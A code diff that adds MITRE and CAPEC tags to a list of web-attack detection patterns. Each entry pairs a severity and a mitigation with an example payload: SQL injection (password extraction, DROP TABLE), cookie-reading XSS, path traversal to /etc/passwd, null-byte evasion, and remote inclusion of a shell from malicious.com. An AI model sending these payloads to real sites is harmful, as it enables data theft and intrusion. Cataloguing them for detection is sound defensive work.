@@ -23,6 +23,7 @@ ATTACK_PATTERNS = [
         "payload_example": "/index.php?id=1 OR 1=1",
         "severity": "high",
         "mitigation": "Use parameterized queries / prepared statements. Implement strict input validation.",
+        "mitre": "CAPEC-66 | T1505",
     },
     {
         "pattern_id": "sqli_union_select",
@@ -32,6 +33,7 @@ ATTACK_PATTERNS = [
         "payload_example": "/products.php?cat=1 UNION SELECT username, password FROM users",
         "severity": "high",
         "mitigation": "Use parameterized SQL queries. Enforce strict database permission models (least privilege).",
+        "mitre": "CAPEC-66 | T1505",
     },
     {
         "pattern_id": "sqli_stacked_query",
@@ -41,6 +43,7 @@ ATTACK_PATTERNS = [
         "payload_example": "/users.php?id=5; DROP TABLE logs;",
         "severity": "critical",
         "mitigation": "Disable multi-query support in the database driver. Apply parameterized queries.",
+        "mitre": "CAPEC-66 | T1505",
     },
     {
         "pattern_id": "sqli_error_based",
@@ -50,6 +53,7 @@ ATTACK_PATTERNS = [
         "payload_example": "/item.php?id=1' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT database()),0x3a,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
         "severity": "high",
         "mitigation": "Disable detailed database error messages in production. Use parameterized queries.",
+        "mitre": "CAPEC-66 | T1505",
     },
     {
         "pattern_id": "xss_script_tag",
@@ -59,6 +63,7 @@ ATTACK_PATTERNS = [
         "payload_example": "/search.php?q=<script>alert(document.cookie)</script>",
         "severity": "high",
         "mitigation": "Context-aware HTML escaping/encoding. Implement Content Security Policy (CSP).",
+        "mitre": "CAPEC-63 | T1059",
     },
     {
         "pattern_id": "xss_html_event_handler",
@@ -68,6 +73,7 @@ ATTACK_PATTERNS = [
         "payload_example": "/profile.php?name=<img src=x onerror=alert('XSS')>",
         "severity": "high",
         "mitigation": "Sanitize HTML inputs using libraries like DOMPurify. Enforce a strong CSP.",
+        "mitre": "CAPEC-63 | T1059",
     },
     {
         "pattern_id": "xss_javascript_uri",
@@ -77,6 +83,7 @@ ATTACK_PATTERNS = [
         "payload_example": "/redir.php?url=javascript:alert('XSS')",
         "severity": "high",
         "mitigation": "Validate and sanitize URLs (e.g., only allow http/https protocols). Escape outputs.",
+        "mitre": "CAPEC-63 | T1059",
     },
     {
         "pattern_id": "traversal_dotdot",
@@ -86,6 +93,7 @@ ATTACK_PATTERNS = [
         "payload_example": "/download.php?file=../../../../etc/passwd",
         "severity": "high",
         "mitigation": "Avoid passing user input directly to file APIs. Use a whitelist of files or canonicalize paths and verify they stay within the web root.",
+        "mitre": "CAPEC-126 | T1505",
     },
     {
         "pattern_id": "traversal_encoded",
@@ -95,6 +103,7 @@ ATTACK_PATTERNS = [
         "payload_example": "/view.php?file=%252e%252e%252f%252e%252e%252fetc/passwd",
         "severity": "medium",
         "mitigation": "Perform input normalization (fully decode the path) BEFORE applying safety validations and filters.",
+        "mitre": "CAPEC-126 | T1505",
     },
     {
         "pattern_id": "traversal_absolute",
@@ -104,6 +113,7 @@ ATTACK_PATTERNS = [
         "payload_example": "/read.php?path=c:\\windows\\win.ini",
         "severity": "high",
         "mitigation": "Restrict file system permissions for the web server process. Enforce strict parameter validation.",
+        "mitre": "CAPEC-126 | T1505",
     },
     {
         "pattern_id": "scanner_sqlmap_scan",
@@ -113,6 +123,7 @@ ATTACK_PATTERNS = [
         "payload_example": "/index.php?id=1 AND 1=1&User-Agent=sqlmap/1.4.12",
         "severity": "medium",
         "mitigation": "Implement rate limiting, deploy Web Application Firewall (WAF) rule sets, and monitor IP reputation lists.",
+        "mitre": "T1595 | T1505",
     },
     {
         "pattern_id": "scanner_nikto_scan",
@@ -122,6 +133,7 @@ ATTACK_PATTERNS = [
         "payload_example": "/test.php?q=nikto_test_file&User-Agent=Mozilla/5.0 (Nikto/2.1.6)",
         "severity": "medium",
         "mitigation": "Filter traffic using WAF or block user agents known to be malicious/scanners.",
+        "mitre": "T1595 | T1505",
     },
     {
         "pattern_id": "sensitive_admin_access",
@@ -131,6 +143,7 @@ ATTACK_PATTERNS = [
         "payload_example": "/phpmyadmin/index.php",
         "severity": "medium",
         "mitigation": "Restrict access to administrative paths using IP whitelisting, VPN, or multi-factor authentication.",
+        "mitre": "T1505 | T1078",
     },
     {
         "pattern_id": "sensitive_config_access",
@@ -140,6 +153,7 @@ ATTACK_PATTERNS = [
         "payload_example": "/.git/config",
         "severity": "critical",
         "mitigation": "Configure the web server to deny access to hidden files and directories (like .git, .env, and backups).",
+        "mitre": "T1505 | T1083",
     },
     {
         "pattern_id": "evasion_null_byte",
@@ -149,6 +163,7 @@ ATTACK_PATTERNS = [
         "payload_example": "/show.php?file=secret.pdf%00.jpg",
         "severity": "high",
         "mitigation": "Normalize input strings by removing null bytes before processing, or use modern language runtimes that are not null-terminated.",
+        "mitre": "T1562",
     },
     {
         "pattern_id": "lfi_remote_inclusion",
@@ -158,6 +173,7 @@ ATTACK_PATTERNS = [
         "payload_example": "/load.php?page=http://malicious.com/shell.txt",
         "severity": "critical",
         "mitigation": "Disable allow_url_include in PHP configurations. Avoid dynamic file includes based on user input.",
+        "mitre": "CAPEC-252 | T1505",
     }
 ]
 
